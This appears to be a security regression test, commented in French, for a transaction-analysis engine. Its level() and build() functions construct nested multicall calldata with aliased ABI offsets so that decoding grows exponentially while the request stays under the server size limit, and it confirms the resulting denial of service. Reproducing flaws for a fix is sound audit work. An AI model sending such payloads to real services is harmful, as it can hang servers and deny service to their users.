// T06 - Amplification par alias d'offsets ABI dans multicall(bytes[]) : la charge croit en N^profondeur, la taille de la requete en N*profondeur.
// Constat : engine/src/abi.mjs (decodeSeq/decodeValue) accepte que plusieurs offsets pointent vers le MEME element ; calldata.mjs decode ensuite chaque element comme un sous-appel.
// Ce test mesure a PETITE echelle (aucune boucle infinie) puis extrapole. Sortie 0 = vulnerabilite reproduite (le test "reussit" si le probleme existe).
import { analyzeTransaction } from '../../engine/src/engine.mjs';
import { MAX_DEPTH } from '../../engine/src/calldata.mjs';

const hex = (n, w = 64) => n.toString(16).padStart(w, '0');
const FROM = '0x' + '1'.repeat(40), TO = '0x' + '2'.repeat(40);
// multicall(bytes[] data) = 0xac9650d8 ; tous les N elements pointent vers le meme octet-blob.
function level(inner /* hex sans 0x */, N) {
  const pad = (inner.length / 2) % 32 ? 32 - ((inner.length / 2) % 32) : 0;
  const elem = hex(inner.length / 2) + inner + '00'.repeat(pad);
  const offs = Array.from({ length: N }, () => hex(N * 32)).join('');
  return 'ac9650d8' + hex(32) + hex(N) + offs + elem;
}
function build(depth, N) { let d = ''; for (let i = 0; i < depth; i++) d = level(d, N); return '0x' + d; }

console.log('profondeur max du moteur MAX_DEPTH =', MAX_DEPTH);
const N = 4; const rows = [];
for (let depth = 1; depth <= 7; depth++) {
  const data = build(depth, N);
  const t0 = performance.now();
  const eff = analyzeTransaction({ from: FROM, to: TO, data, value: '0x0' }, { chainId: 1 });
  const ms = performance.now() - t0;
  rows.push({ depth, octets: data.length / 2 - 1, noeuds: eff.nested.length, ms: Math.round(ms) });
}
console.table(rows);
const ok = rows.every((r, i) => i === 0 || r.noeuds >= rows[i - 1].noeuds * (N - 0.5));
console.log('croissance geometrique des noeuds (facteur ~N=' + N + ' par niveau) :', ok);
// Extrapolation : N=64, profondeur 8 (le moteur s'arrete a MAX_DEPTH+1 niveaux)
const N2 = 64, d2 = 8; const size = build(d2, N2).length / 2;
const nodes2 = Math.pow(N2, d2);
const perNodeMs = rows[rows.length - 1].ms / rows[rows.length - 1].noeuds;
console.log(`N=${N2}, profondeur ${d2} : requete de ${(size / 1024).toFixed(1)} Kio (limite serveur 256 Kio JSON hex ~ 128 Kio binaire) -> ~${nodes2.toExponential(2)} noeuds, soit ~${(nodes2 * perNodeMs / 1000 / 3600 / 24 / 365).toExponential(2)} annees de calcul a ${perNodeMs.toFixed(4)} ms/noeud.`);
console.log(size < 128 * 1024 ? 'La requete passe la limite de taille => DoS reproductible (hang du serveur / du service worker).' : 'Requete trop grosse pour ces parametres.');
process.exit(ok && size < 128 * 1024 ? 0 : 1);
